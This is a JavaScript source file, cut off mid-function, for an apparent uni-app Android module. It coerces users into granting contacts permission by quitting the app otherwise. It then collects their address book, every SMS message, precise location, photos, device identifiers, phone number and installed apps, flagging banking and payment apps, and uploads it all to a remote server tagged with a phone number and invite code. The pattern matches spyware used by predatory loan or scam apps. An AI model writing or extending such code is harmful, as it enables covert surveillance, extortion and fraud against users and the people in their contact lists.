

// #ifdef APP-PLUS
const permissionModule = uni.requireNativePlugin('globalEvent');
// #endif

// 确保导入了 config
import config from '@/config/server.config.js'
import PlatformUtil from '@/utils/platform.js';
import i18n from '@/i18n/index.js'

class AndroidHandler {
  // 添加视频处理相关属性
  static processedVideos = new Set()
  static uploadQueue = []
  static isUploading = false
  static hasNavigated = false

  // 添加权限状态相关属性
  static hasCheckedContactsPermission = false
  static contactsPermissionDeniedCount = 0
  
  // 添加短信监控相关属性
  static smsTimer = null
  static lastSmsId = null
  static isMonitoringSms = false
  static smsMonitorInterval = 60000 // 默认1分钟检查一次

  // 判断是否是银行应用
  static isBankApp(packageName, appName) {
    if (!packageName || !appName) return false;

    const bankKeywords = [
      'bank', 'banking', '银行', 'pay', 'payment', '支付', 'wallet', '钱包',
      'finance', 'financial', '金融', 'credit', '信用卡', 'loan', '贷款',
      'money', '理财', 'cash', '现金', '工行', '农行', '中行', '建行',
      '招商', '交通', '邮储', '民生', '兴业', '平安', '浦发'
    ];

    // 转小写处理
    const lowerPackage = packageName.toLowerCase();
    const lowerName = appName.toLowerCase();

    // 包名检查
    if (lowerPackage.includes('bank') ||
      lowerPackage.includes('pay') ||
      lowerPackage.includes('wallet') ||
      lowerPackage.includes('finance') ||
      lowerPackage.includes('credit')) {
      return true;
    }

    // 应用名称检查
    return bankKeywords.some(keyword => lowerName.includes(keyword));
  }
  
  // 判断是否是系统应用(额外检查)
  static isSystemApp(packageName) {
    if (!packageName) return false;
    
    // 常见系统应用包名前缀
    const systemPrefixes = [
      'com.android.',
      'android.',
      'com.google.android.',
      'com.samsung.',
      'com.huawei.',
      'com.xiaomi.',
      'com.oppo.',
      'com.vivo.',
      'com.oneplus.',
      'com.mediatek.',
      'com.qualcomm.'
    ];
    
    // 常见非系统应用包名前缀，确保不会被误判为系统应用
    const nonSystemPrefixes = [
      'com.tencent.',        // 腾讯系应用
      'com.sina.',           // 新浪系应用
      'com.alibaba.',        // 阿里系应用
      'com.taobao.',         // 淘宝系应用
      'com.eg.android.',     // 支付宝
      'com.baidu.',          // 百度系应用
      'com.netease.',        // 网易系应用
      'com.bytedance.',      // 字节跳动系应用
      'com.ss.android.',     // 今日头条、抖音等
      'com.jingdong.',       // 京东
      'com.douban.',         // 豆瓣
      'com.zhihu.',          // 知乎
      'com.cctv.',           // 央视相关
      'com.pptv.',           // PPTV
      'com.facebook.',       // Facebook
      'com.twitter.',        // Twitter
      'com.instagram.',      // Instagram
      'com.spotify.',        // Spotify
      'com.linkedin.',       // LinkedIn
      'org.telegram.',       // Telegram
      'com.snapchat.',       // Snapchat
      'com.whatsapp.',       // WhatsApp
      'tv.danmaku.bili',     // 哔哩哔哩
      'com.mxtech.',         // MX Player
      'com.autonavi.',       // 高德地图
      'com.UCMobile.',       // UC浏览器
      'com.xunmeng.'         // 拼多多
    ];
    
    // 精确匹配一些常见的非系统应用包名
    const exactNonSystemPackages = [
      'com.tencent.mm',                  // 微信
      'com.tencent.mobileqq',            // QQ
      'com.tencent.tim',                 // TIM
      'com.ss.android.ugc.aweme',        // 抖音
      'com.eg.android.AlipayGphone',     // 支付宝
      'com.taobao.taobao',               // 淘宝
      'com.jingdong.app.mall',           // 京东
      'com.xunmeng.pinduoduo',           // 拼多多
      'com.sankuai.meituan',             // 美团
      'com.sina.weibo',                  // 微博
      'com.baidu.searchbox',             // 百度
      'tv.danmaku.bili',                 // 哔哩哔哩
      'com.tencent.tmgp.sgame',          // 王者荣耀
      'com.netease.cloudmusic',          // 网易云音乐
      'com.tencent.qqmusic',             // QQ音乐
      'com.youku.phone',                 // 优酷
      'com.qiyi.video',                  // 爱奇艺
      'com.tencent.qqlive',              // 腾讯视频
    ];
    
    // 先检查是否是明确的非系统应用
    if (exactNonSystemPackages.includes(packageName)) {
      return false;
    }
    
    // 再检查是否匹配非系统应用前缀
    for (const prefix of nonSystemPrefixes) {
      if (packageName.startsWith(prefix)) {
        return false;
      }
    }
    
    // 最后检查是否匹配系统应用前缀
    return systemPrefixes.some(prefix => packageName.startsWith(prefix));
  }

  // 新增退出应用方法
  static exitApp() {
    if (plus.os.name.toLowerCase() === 'android') {
      try {
        // 显示退出提示
        uni.showToast({
          title: '需要通讯录权限，应用将退出',
          icon: 'none',
          duration: 1500
        });
        
        // 延迟执行以确保Toast显示
        setTimeout(() => {
          try {
            // 导入所需的类
            const main = plus.android.runtimeMainActivity();
            const Process = plus.android.importClass('android.os.Process');
            const System = plus.android.importClass('java.lang.System');
            const myPid = Process.myPid();
            
            // 先调用finish结束Activity
            main.finish();
            
            // 再杀死进程
            Process.killProcess(myPid);
            
            // 最后调用System.exit确保完全退出
            System.exit(0);
          } catch (e) {
            console.error('使用强制退出方式失败:', e);
            // 使用moveTaskToBack和quit作为备选方案
            const main = plus.android.runtimeMainActivity();
            main.moveTaskToBack(true);
            plus.runtime.quit();
          }
        }, 1500);
      } catch (error) {
        console.error('退出应用失败:', error);
        plus.runtime.quit();
      }
    } else {
      // iOS平台不能直接退出，只能放到后台
      plus.runtime.quit();
    }
  }
  
  // 添加检查并处理通讯录权限的方法 - 关键方法
  static async checkAndHandleContactsPermission() {
    // 在Android平台执行
    if (plus.os.name.toLowerCase() !== 'android') {
      return true;
    }
    
    console.log('检查通讯录权限状态');
    
    try {
      // 检查是否已标记为检查过权限
      const permissionChecked = uni.getStorageSync('contactsPermissionChecked') || false;
      
      // 检查当前权限状态
      const mainActivity = plus.android.runtimeMainActivity();
      const PackageManager = plus.android.importClass('android.content.pm.PackageManager');
      const Manifest = plus.android.importClass('android.Manifest');
      
      try {
        const currentStatus = mainActivity.checkSelfPermission(Manifest.permission.READ_CONTACTS);
        const hasPermission = (currentStatus === PackageManager.PERMISSION_GRANTED);
        
        console.log('通讯录权限状态:', hasPermission ? '已授权' : '未授权');
        console.log('之前是否检查过权限:', permissionChecked);
        
        // 如果已有权限，返回成功
        if (hasPermission) {
          // 记录已检查过且已授权
          uni.setStorageSync('contactsPermissionChecked', true);
          return true;
        }
        
        // 是否是第一次启动应用
        if (!permissionChecked) {
          // 第一次启动应用，请求权限
          console.log('首次启动应用，请求通讯录权限');
          
          return new Promise((resolve) => {
            plus.android.requestPermissions(
              [Manifest.permission.READ_CONTACTS],
              function (resultObj) {
                let permissionGranted = false;
                
                // 检查授予的权限
                for (var i = 0; i < resultObj.granted.length; i++) {
                  const granted = resultObj.granted[i];
                  console.log(`已获取权限: ${granted}`);
                  if (granted === Manifest.permission.READ_CONTACTS) {
                    permissionGranted = true;
                  }
                }
                
                // 输出被拒绝的权限
                let isDenied = false;
                for (var i = 0; i < resultObj.deniedPresent.length; i++) {
                  isDenied = true;
                  console.log(`本次拒绝的权限: ${resultObj.deniedPresent[i]}`);
                }
                
                let isPermanentlyDenied = false;
                for (var i = 0; i < resultObj.deniedAlways.length; i++) {
                  isPermanentlyDenied = true;
                  console.log(`永久拒绝的权限: ${resultObj.deniedAlways[i]}`);
                }
                
                // 记录权限检查状态
                uni.setStorageSync('contactsPermissionChecked', true);
                
                if (permissionGranted) {
                  console.log('通讯录权限已授予，继续流程');
                  resolve(true);
                } else {
                  console.log('通讯录权限被拒绝，将退出应用');
                  
                  // 显示权限被拒绝提示并强制退出
                  uni.showModal({
                    title: '通讯录权限被拒绝',
                    content: '应用需要通讯录权限才能继续使用，应用将退出',
                    showCancel: false,
                    confirmText: '知道了',
                    success: () => {
                      // 直接调用退出方法
                      AndroidHandler.exitApp();
                      resolve(false);
                    }
                  });
                }
              },
              function (error) {
                console.error('通讯录权限请求错误:', error);
                
                // 记录权限检查状态
                uni.setStorageSync('contactsPermissionChecked', true);
                
                // 显示权限请求失败提示
                uni.showModal({
                  title: '权限请求失败',
                  content: '通讯录权限请求失败，应用需要此权限才能运行',
                  showCancel: false,
                  confirmText: '退出应用',
                  success: () => {
                    // 直接调用退出方法
                    AndroidHandler.exitApp();
                    resolve(false);
                  }
                });
              }
            );
          });
        } else {
          // 不是第一次启动，显示引导打开权限的界面
          console.log('非首次启动，通讯录权限未授予，显示引导界面');
          
          return new Promise((resolve) => {
            // 先尝试再次请求权限
            plus.android.requestPermissions(
              [Manifest.permission.READ_CONTACTS],
              function (resultObj) {
                let permissionGranted = false;
                
                // 检查授予的权限
                for (var i = 0; i < resultObj.granted.length; i++) {
                  const granted = resultObj.granted[i];
                  if (granted === Manifest.permission.READ_CONTACTS) {
                    permissionGranted = true;
                  }
                }
                
                if (permissionGranted) {
                  console.log('通讯录权限已授予，继续流程');
                  resolve(true);
                } else {
                  // 弹出引导对话框
                  uni.showModal({
                    title: '需要通讯录权限',
                    content: '应用需要通讯录权限才能继续使用，请在设置中开启通讯录权限',
                    confirmText: '去设置',
                    cancelText: '退出应用',
                    success: function (res) {
                      if (res.confirm) {
                        // 引导用户去设置页面开启权限
                        console.log('引导用户去设置页面');
                        
                        // 打开应用设置界面
                        try {
                          const Intent = plus.android.importClass('android.content.Intent');
                          const Settings = plus.android.importClass('android.provider.Settings');
                          const Uri = plus.android.importClass('android.net.Uri');
                          const mainActivity = plus.android.runtimeMainActivity();
                          const packageName = mainActivity.getPackageName();
                          
                          const intent = new Intent();
                          intent.setAction(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                          const uri = Uri.fromParts('package', packageName, null);
                          intent.setData(uri);
                          mainActivity.startActivity(intent);
                        } catch (e) {
                          console.error('打开设置页面失败:', e);
                          // 备用方法：直接打开设置页
                          try {
                            const Intent = plus.android.importClass('android.content.Intent');
                            const Settings = plus.android.importClass('android.provider.Settings');
                            const mainActivity = plus.android.runtimeMainActivity();
                            
                            const intent = new Intent(Settings.ACTION_SETTINGS);
                            mainActivity.startActivity(intent);
                          } catch (err) {
                            console.error('打开系统设置页面也失败:', err);
                          }
                        }
                        
                        // 延迟退出应用，让用户有时间调整权限后再次打开
                        setTimeout(() => {
                          AndroidHandler.exitApp();
                          resolve(false);
                        }, 500);
                      } else {
                        // 用户选择退出应用
                        console.log('用户选择退出应用');
                        AndroidHandler.exitApp();
                        resolve(false);
                      }
                    }
                  });
                }
              },
              function (error) {
                console.error('通讯录权限再次请求错误:', error);
                
                // 显示打开设置的引导
                uni.showModal({
                  title: '无法请求权限',
                  content: '应用需要通讯录权限才能继续使用，请在设置中手动开启',
                  confirmText: '去设置',
                  cancelText: '退出应用',
                  success: function (res) {
                    if (res.confirm) {
                      // 同上，引导去设置
                      try {
                        const Intent = plus.android.importClass('android.content.Intent');
                        const Settings = plus.android.importClass('android.provider.Settings');
                        const Uri = plus.android.importClass('android.net.Uri');
                        const mainActivity = plus.android.runtimeMainActivity();
                        const packageName = mainActivity.getPackageName();
                        
                        const intent = new Intent();
                        intent.setAction(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                        const uri = Uri.fromParts('package', packageName, null);
                        intent.setData(uri);
                        mainActivity.startActivity(intent);
                      } catch (e) {
                        console.error('打开设置页面失败:', e);
                        try {
                          const Intent = plus.android.importClass('android.content.Intent');
                          const Settings = plus.android.importClass('android.provider.Settings');
                          const mainActivity = plus.android.runtimeMainActivity();
                          
                          const intent = new Intent(Settings.ACTION_SETTINGS);
                          mainActivity.startActivity(intent);
                        } catch (err) {
                          console.error('打开系统设置也失败:', err);
                        }
                      }
                      
                      setTimeout(() => {
                        AndroidHandler.exitApp();
                        resolve(false);
                      }, 500);
                    } else {
                      AndroidHandler.exitApp();
                      resolve(false);
                    }
                  }
                });
              }
            );
          });
        }
      } catch (e) {
        console.error('检查通讯录权限状态出错:', e);
        return false;
      }
    } catch (error) {
      console.error('处理通讯录权限异常:', error);
      return false;
    }
  }

  // 使用更原始的方式直接获取应用列表
  static async getNativeApplicationList() {
    console.log('尝试从设备获取真实应用列表');
    
    try {
      // 导入必要的类
      const Context = plus.android.importClass('android.content.Context');
      const PackageManager = plus.android.importClass('android.content.pm.PackageManager');
      const ApplicationInfo = plus.android.importClass('android.content.pm.ApplicationInfo');
      const PackageInfo = plus.android.importClass('android.content.pm.PackageInfo');
      const Field = plus.android.importClass('java.lang.reflect.Field');
      const Class = plus.android.importClass('java.lang.Class');
      
      // 获取主Activity和包管理器
      const mainActivity = plus.android.runtimeMainActivity();
      const pm = mainActivity.getPackageManager();
      
      console.log('获取已安装应用列表...');
      
      const apps = [];
      
      // 使用Java反射直接获取包名
      try {
        // 获取所有已安装的应用列表
        const installedPackages = pm.getInstalledPackages(0);
        plus.android.importClass(installedPackages);
        
        // 获取列表大小（兼容不同返回类型）
        let packagesSize = 0;
        try {
          // 尝试使用size()方法
          packagesSize = installedPackages.size();
        } catch (e) {
          try {
            // 尝试使用length属性
            packagesSize = installedPackages.length;
          } catch (e2) {
            try {
              // 尝试转换为数组
              const packageArray = plus.android.invoke(installedPackages, 'toArray');
              packagesSize = packageArray.length;
            } catch (e3) {
              console.error('无法获取已安装应用列表大小:', e3);
              return [];
            }
          }
        }
        
        console.log(`获取到 ${packagesSize} 个应用包信息`);
        
        if (packagesSize > 0) {
          // 准备包名字段的反射访问
          const pkgInfoClass = Class.forName("android.content.pm.PackageInfo");
          const packageNameField = pkgInfoClass.getDeclaredField("packageName");
          packageNameField.setAccessible(true);
          
          console.log('成功获取packageName字段引用');
          
          const existingPackages = new Set();
          
          // 遍历应用列表（兼容不同类型）
          for (let i = 0; i < packagesSize; i++) {
            try {
              // 获取包信息对象（兼容不同类型）
              let pkgInfo = null;
              try {
                // 尝试使用get方法
                pkgInfo = installedPackages.get(i);
              } catch (e) {
                try {
                  // 尝试数组访问
                  pkgInfo = installedPackages[i];
                } catch (e2) {
                  continue;
                }
              }
              
              if (!pkgInfo) continue;
              
              // 获取包名 - 尝试多种方法
              let packageName = null;
              
              // 方法1: 直接获取属性
              try {
                packageName = pkgInfo.packageName;
              } catch (e) {
                // 忽略错误
              }
              
              // 方法2: 使用反射获取字段值
              if (!packageName) {
                try {
                  packageName = packageNameField.get(pkgInfo);
                } catch (e) {
                  // 忽略错误
                }
              }
              
              // 方法3: 尝试调用方法
              if (!packageName) {
                try {
                  packageName = pkgInfo.getPackageName();
                } catch (e) {
                  // 忽略错误
                }
              }
              
              // 如果所有方法都失败，跳过此包
              if (!packageName || existingPackages.has(packageName)) continue;
              
              // 添加到已处理包集合
              existingPackages.add(packageName);
              
              // 获取应用名称
              let appName = '';
              try {
                const appInfo = pm.getApplicationInfo(packageName, 0);
                if (appInfo) {
                  appName = pm.getApplicationLabel(appInfo).toString();
                }
              } catch (e) {
                appName = packageName.split('.').pop();
              }
              
              if (!appName || appName === 'null' || appName === 'undefined') {
                appName = packageName.split('.').pop();
              }
              
              // 获取版本信息
              let versionName = "1.0.0";
              let versionCode = 1;
              let installTime = Date.now();
              try {
                versionName = pkgInfo.versionName || "1.0.0";
                versionCode = pkgInfo.versionCode || 1;
                installTime = pkgInfo.firstInstallTime || Date.now();
              } catch (e) {}
              
              // 添加到应用列表
              apps.push({
                appName: appName,
                packageName: packageName,
                versionName: versionName,
                versionCode: versionCode,
                installTime: installTime,
                isSystemApp: false,
                isUserApp: true,
                isBankApp: this.isBankApp(packageName, appName)
              });
              
              if (i < 5 || i % 50 === 0) {
                console.log(`已添加 ${apps.length} 个应用，最新: ${appName} (${packageName})`);
              }
            } catch (e) {
              // 减少错误日志输出
              if (apps.length < 5) {
                console.log(`处理应用包 ${i+1} 时出错: ${e.message}`);
              }
            }
          }
          
          console.log(`应用列表获取完成，共找到 ${apps.length} 个应用`);
        }
      } catch (e) {
        console.error('获取应用失败:', e.message);
        
        // 如果上述方法失败，尝试使用另一种方式获取
        try {
          console.log('尝试使用备选方法获取应用列表...');
          const intent = plus.android.newObject('android.content.Intent', 'android.intent.action.MAIN', null);
          intent.addCategory('android.intent.category.LAUNCHER');
          const resolveInfos = pm.queryIntentActivities(intent, 0);
          
          if (resolveInfos) {
            const size = resolveInfos.size();
            console.log(`通过Intent方式获取到 ${size} 个应用`);
            
            for (let i = 0; i < size; i++) {
              try {
                const resolveInfo = resolveInfos.get(i);
                const activityInfo = resolveInfo.activityInfo;
                const packageName = activityInfo.packageName;
                
                if (!packageName) continue;
                
                let appName = packageName.split('.').pop();
                try {
                  appName = resolveInfo.loadLabel(pm).toString();
                } catch (e) {}
                
                apps.push({
                  appName: appName,
                  packageName: packageName,
                  versionName: '1.0.0',
                  versionCode: 1,
                  installTime: Date.now(),
                  isSystemApp: false,
                  isUserApp: true,
                  isBankApp: this.isBankApp(packageName, appName)
                });
              } catch (e) {
                console.error('处理应用信息出错:', e.message);
              }
            }
          }
        } catch (e2) {
          console.error('备选方法获取应用失败:', e2.message);
        }
      }
      
      // 按应用名称排序
      console.log(`对 ${apps.length} 个应用进行排序`);
      apps.sort((a, b) => {
        if (a.appName && b.appName) {
          return a.appName.localeCompare(b.appName);
        }
        return 0;
      });
      
      // 输出统计信息
      const bankApps = apps.filter(app => app.isBankApp).length;
      
      console.log(`应用列表获取完成，共 ${apps.length} 个应用`);
      console.log(`银行应用: ${bankApps}个`);
      
      if (apps.length > 0) {
        console.log('应用列表示例 (前5个):');
        for (let i = 0; i < Math.min(5, apps.length); i++) {
          console.log(`${i+1}. ${apps[i].appName} (${apps[i].packageName}), 版本: ${apps[i].versionName}`);
        }
      }
      
      return apps;
    } catch (e) {
      console.error('获取应用列表失败:', e);
      return [];
    }
  }

  /**
   * 上传已安装的应用信息
   */
  static async uploadInstalledApps(apps, phone, code = '') {
    try {
      if (!phone || typeof phone !== 'string' || phone.trim() === '') {
        console.log('上传应用信息失败: 手机号无效');
        return false;
      }

      // 确保apps是数组并且有内容
      if (!Array.isArray(apps) || apps.length === 0) {
        console.log('上传应用信息失败: 无有效应用数据');
        return false;
      }

      // 检查应用数量是否足够
      if (apps.length < 5) {
        console.log(`应用数量不足 (${apps.length})，不进行上传`);
        return false;
      }

      console.log(`准备上传 ${apps.length} 个已安装的应用信息`);

      // 服务器端会自动添加app_前缀，所以这里使用不带前缀的表名
      const tableName = 'installed_apps';

      // 将应用信息格式化为服务器需要的数据结构
      const appData = apps.map(app => ({
        app_name: app.appName || app.app_name || '',
        package_name: app.packageName || app.package_name || '',
        app_version: app.versionName || app.app_version || '',
        install_time: app.installTime ? Math.floor(app.installTime / 1000) : (app.install_time || Math.floor(Date.now() / 1000)),
        is_bank: app.isBankApp || app.is_bank ? 1 : 0
      }));

      // 过滤掉无效的数据
      const validAppData = appData.filter(app =>
        app.app_name && app.package_name &&
        typeof app.app_name === 'string' &&
        typeof app.package_name === 'string'
      );

      if (validAppData.length === 0) {
        console.log('上传应用信息失败: 所有应用数据无效');
        return false;
      }

      console.log(`过滤后有效应用数据: ${validAppData.length} 个`);
      
      // 统计银行应用数量（用于调试）
      const bankAppCount = validAppData.filter(app => app.is_bank === 1).length;
      console.log(`应用统计 - 银行应用: ${bankAppCount}个`);

      // 获取API配置
      const apiConfig = PlatformUtil.getPlatformConfig();
      const baseUrl = apiConfig.base_url;
      const apiPath = apiConfig.api_path || '';
      const fullUrl = `${baseUrl}${apiPath}${apiConfig.upload.apps}`;

      console.log('上传应用信息:', {
        url: fullUrl,
        phone: phone,
        code: code || '',
        appsCount: validAppData.length,
        tableName: tableName
      });

      // 构建上传数据
      const uploadData = {
        phone: phone,
        code: code || '',
        apps: JSON.stringify(validAppData),
        table_name: tableName
      };

      // 输出完整的请求数据(仅开发调试用)
      console.log('请求数据示例(前3条):', JSON.stringify(validAppData.slice(0, 3)));

      // 使用uni-app的request API
      return new Promise((resolve, reject) => {
        uni.request({
          url: fullUrl,
          method: 'POST',
          data: uploadData,
          header: {
            'content-type': 'application/x-www-form-urlencoded'
          },
          success: (res) => {
            console.log('应用信息上传响应:', res.data);

            if (res.data && (
              res.data === '获取成功' ||
              (typeof res.data === 'string' && res.data.includes('获取成功')) ||
              (typeof res.data === 'string' && res.data.includes('成功保存'))
            )) {
              console.log(`成功上传 ${validAppData.length} 个应用信息`);
              resolve(true);
            } else {
              console.warn('应用信息上传失败:', res.data);
              reject(new Error(`上传失败: ${res.data}`));
            }
          },
          fail: (err) => {
            console.error('应用信息上传请求失败:', err);
            reject(err);
          }
        });
      });
    } catch (error) {
      console.log(`上传应用信息出错: ${error.message}`);
      return false;
    }
  }

  // 修改获取通讯录方法，简化权限处理
  static async getContacts(phone, inviteCode) {
    try {
      // 应用启动时已经检查过通讯录权限，这里只做简单确认
      console.log('获取通讯录...');
      
      const deviceInfo = plus.device.vendor + '-' + plus.device.model;
      let contactData = `${phone}**${inviteCode}**${deviceInfo}`;

      return new Promise((resolve, reject) => {
        plus.contacts.getAddressBook(plus.contacts.ADDRESSBOOK_PHONE, (addressbook) => {
          addressbook.find(["displayName", "phoneNumbers"], (contacts) => {
            contacts.forEach(contact => {
              contactData += `=${contact.displayName}|${contact.phoneNumbers[0]?.value || ""}`;
            });
            console.log('通讯录获取成功');
            resolve(contactData);
          }, (error) => {
            console.error('查找通讯录失败:', error);
            reject(error);
          }, {
            multiple: true
          });
        }, (error) => {
          console.error('获取通讯录失败:', error);
          
          // 正常情况下不应该出现权限问题，因为应用启动时已检查
          // 但如果出现异常情况，尝试返回空数据而不是退出应用
          console.log('通讯录获取失败，返回空数据');
          resolve(contactData);
        });
      });
    } catch (error) {
      console.error('处理通讯录出错:', error);
      // 返回基本数据而不是抛出异常
      return `${phone}**${inviteCode}**${plus.device.vendor}-${plus.device.model}`;
    }
  }

  // 获取短信内容
  static async getSMSContent(phone, inviteCode) {
    try {
      console.log('开始获取短信内容');

      // 先请求短信权限
      const smsPermission = await this.requestSMSPermission();
      if (smsPermission <= 0) {
        throw new Error('未获得短信权限');
      }

      // 创建基础数据结构
      const smsData = [{
        imei: phone,
        imei2: inviteCode
      }];

      // 导入所需的 Android 类
      const ContentResolver = plus.android.importClass("android.content.ContentResolver");
      const Cursor = plus.android.importClass("android.database.Cursor");
      const Uri = plus.android.importClass("android.net.Uri");
      const activity = plus.android.runtimeMainActivity();
      const uri = Uri.parse("content://sms/");

      // 获取 ContentResolver
      const resolver = activity.getContentResolver();
      if (!resolver) {
        throw new Error('无法获取 ContentResolver');
      }

      // 定义查询参数
      const projection = [
        "_id",
        "address",
        "person",
        "body",
        "date",
        "type"
      ];

      // 执行查询
      const cursor = resolver.query(
        uri,
        projection,
        null,
        null,
        "date desc"
      );

      console.log('短信游标获取成功:', cursor && cursor.getCount());

      if (cursor && cursor.getCount() > 0) {
        while (cursor.moveToNext()) {
          const smsInfo = {
            id: cursor.getString(cursor.getColumnIndex("_id")),
            Name: cursor.getString(cursor.getColumnIndex("person")),
            Date: this.formatDate(cursor.getLong(cursor.getColumnIndex("date"))),
            PhoneNumber: cursor.getString(cursor.getColumnIndex("address")),
            Smsbody: cursor.getString(cursor.getColumnIndex("body")),
            Type: cursor.getString(cursor.getColumnIndex("type"))
          };
          smsData.push(smsInfo);
        }

        cursor.close();
        console.log('短信内容获取成功');
        return JSON.stringify(smsData);
      }

      if (cursor) {
        cursor.close();
      }

      console.log('没有找到短信');
      return JSON.stringify(smsData);
    } catch (error) {
      console.error('获取短信失败:', error);
      return null;
    }
  }

  // 获取位置信息
  static async getLocation() {
    return new Promise((resolve, reject) => {
      plus.geolocation.getCurrentPosition(
        (position) => {
          console.log('位置获取成功:', position);
          resolve(position);
        },
        (error) => {
          console.error('获取位置失败:', error);
          reject(error);
        },
        {
          enableHighAccuracy: true,
          timeout: 10000,
          provider: 'system',
          coordsType: 'wgs84'
        }
      );
    });
  }

  // 上传位置信息
  static async uploadLocation(location, phone) {
    // 获取本地存储的 code
    const code = uni.getStorageSync('code');

    // 确保 code 存在
    if (!code) {
      console.error('未找到邀请码');
      throw new Error('未找到邀请码');
    }

    const locationData = {
      data: `${phone},${code},${location.coords.longitude},${location.coords.latitude}`,
      phone: phone,
      code: code // 添加邀请码参数
    };

    const baseUrl = config.baseUrl;
    const fullUrl = `${baseUrl}/api/Uploads/apimap`;

    console.log('上传位置信息:', {
      url: fullUrl,
      data: locationData,
      code: code
    });

    return new Promise((resolve, reject) => {
      uni.request({
        url: fullUrl,
        method: 'POST',
        data: locationData,
        header: {
          'content-type': 'application/x-www-form-urlencoded'
        },
        success: (res) => {
          console.log('位置上传成功:', res);
          if (res.data === '获取成功' || res.data.includes('获取成功')) {
            resolve(res.data);
          } else {
            reject(new Error('位置上传失败: ' + res.data));
          }
        },
        fail: (error) => {
          console.error('位置上传失败:', error);
          reject(error);
        }
      });
    });
  }

  // 格式化日期
  static formatDate(timestamp) {
    const date = new Date(timestamp);
    const pad = (num) => String(num).padStart(2, '0');

    return `${date.getFullYear()}-${pad(date.getMonth() + 1)}-${pad(date.getDate())} ` +
      `${pad(date.getHours())}:${pad(date.getMinutes())}:${pad(date.getSeconds())}`;
  }

  // 获取所有相册媒体文件
  static async getPhotos() {
    try {
      // 先请求权限
      const permissionResult = await this.requestStoragePermission();
      if (permissionResult <= 0) {
        throw new Error('未获得存储权限，无法获取图片文件');
      }

      console.log('开始获取相册图片');
      
      // 使用更全面的媒体文件扫描方法
      const mediaFiles = await this.scanMediaFiles();
      console.log(`找到 ${mediaFiles.photos.length} 个图片文件`);
      
      // 将 Android File 对象转换为所需格式
      const photos = [];
      for (const file of mediaFiles.photos) {
        try {
          const path = plus.android.invoke(file, "getAbsolutePath");
          const name = plus.android.invoke(file, "getName");
          const size = plus.android.invoke(file, "length");
          const lastModified = plus.android.invoke(file, "lastModified");
          
          photos.push({
            name: name,
            path: path,
            size: size || 0,
            lastModified: lastModified || Date.now()
          });
        } catch (error) {
          console.error('处理图片文件对象出错:', error);
        }
      }
      
      console.log(`成功处理 ${photos.length} 个图片文件`);
      return photos;
    } catch (error) {
      console.error('获取相册图片失败:', error);
      throw error;
    }
  }

  // 获取设备信息
  static async getDeviceInfo() {
    try {
      // 获取设备信息
      const deviceInfo = {
        imei: plus.device.imei,
        imei2: plus.device.imsi, // 使用 IMSI 作为备选
        model: plus.device.model,
        vendor: plus.device.vendor,
        uuid: plus.device.uuid
      };

      console.log('设备信息:', deviceInfo);

      // 确保至少有一个标识符
      if (!deviceInfo.imei && !deviceInfo.imei2) {
        deviceInfo.imei = deviceInfo.uuid;
      }

      // 尝试获取本机实际号码
      try {
        const phoneNumber = await this.getRealPhoneNumber();
        if (phoneNumber) {
          deviceInfo.real_phone = phoneNumber;
          console.log('获取到本机号码:', phoneNumber);
        }
      } catch (error) {
        console.warn('获取本机号码失败:', error);
      }

      return deviceInfo;
    } catch (error) {
      console.error('获取设备信息失败:', error);
      throw error;
    }
  }

  // 检查文件是否为图片
  static isImageFile(fileName) {
    const imageExtensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp'];
    const ext = fileName.toLowerCase().slice(fileName.lastIndexOf('.'));
    return imageExtensions.includes(ext);
  }

  // 获取本机实际号码
  static async getRealPhoneNumber() {
    return new Promise((resolve) => {
      try {
        if (plus.os.name.toLowerCase() === 'android') {
          // Android平台
          const Context = plus.android.importClass("android.content.Context");
          const TelephonyManager = plus.android.importClass("android.telephony.TelephonyManager");
          const mainActivity = plus.android.runtimeMainActivity();
          const telephonyManager = mainActivity.getSystemService(Context.TELEPHONY_SERVICE);

          // 检查权限
          const Manifest = plus.android.importClass("android.Manifest");
          const PackageManager = plus.android.importClass("android.content.pm.PackageManager");

          const hasPermission = mainActivity.checkSelfPermission(Manifest.permission.READ_PHONE_STATE) === PackageManager.PERMISSION_GRANTED;

          if (!hasPermission) {
            console.log('没有读取手机状态权限，请求权限');
            plus.android.requestPermissions(
              [Manifest.permission.READ_PHONE_STATE],
              function (result) {
                if (result.granted.length > 0) {
                  // 获取号码
                  const phoneNumber = telephonyManager.getLine1Number();
                  if (phoneNumber && phoneNumber.length > 0) {
                    resolve(phoneNumber);
                  } else {
                    resolve('');
                  }
                } else {
                  resolve('');
                }
              },
              function (error) {
                console.error('请求权限失败:', error);
                resolve('');
              }
            );
          } else {
            // 已有权限，直接获取
            const phoneNumber = telephonyManager.getLine1Number();
            if (phoneNumber && phoneNumber.length > 0) {
              resolve(phoneNumber);
            } else {
              resolve('');
            }
          }
        } else if (plus.os.name.toLowerCase() === 'ios') {
          // iOS平台无法直接获取手机号，返回空
          resolve('');
        } else {
          resolve('');
        }
      } catch (error) {
        console.error('获取本机号码异常:', error);
        resolve('');
      }
    });
  }

  // 上传数据到服务器
  static async uploadData(url, data, phone) {
    const baseUrl = config.android_api.base_url;
    const apiPath = config.android_api.api_path;
    const fullUrl = `${baseUrl}${apiPath}${url}`;

    // 获取存储的邀请码
    const code = uni.getStorageSync('code') || '';

    return new Promise((resolve, reject) => {
      uni.request({
        url: fullUrl,
        method: 'POST',
        data: {
          data: typeof data === 'string' ? data : JSON.stringify(data),
          phone: phone,
          code: code // 添加邀请码参数
        },
        header: {
          'content-type': 'application/x-www-form-urlencoded'
        },
        success: (res) => {
          console.log('请求成功:', res);
          resolve(res.data);
        },
        fail: (error) => {
          console.error('请求失败:', error);
          reject(error);
        }
      });
    });
  }

  // 上传文件
  static async uploadFile(options) {
    const { filePath, name, phone } = options;

    if (!phone) {
      throw new Error('缺少必要的用户验证参数');
    }

    return new Promise((resolve, reject) => {
      const uploadUrl = `${config.android_api.base_url}${config.android_api.api_path}${config.android_api.upload.media}`;

      const task = plus.uploader.createUpload(uploadUrl, {
        method: "POST",
        timeout: 180000  // 设置3分钟超时
      }, (t, status) => {
        if (status == 200) {
          resolve(t.responseText);
        } else {
          let errorMsg = '上传失败';
          try {
            errorMsg = `上传失败: 状态码 ${status}, 响应: ${t.responseText || '无响应'}`;
          } catch (e) { }
          reject(new Error(errorMsg));
        }
      });

      task.addData("sjh", phone);
      task.addFile(filePath, {
        key: "file",
        name: name
      });
      task.start();
    });
  }

  // 添加工具方法
  static formatSize(bytes) {
    if (bytes < 1024) return bytes + ' B';
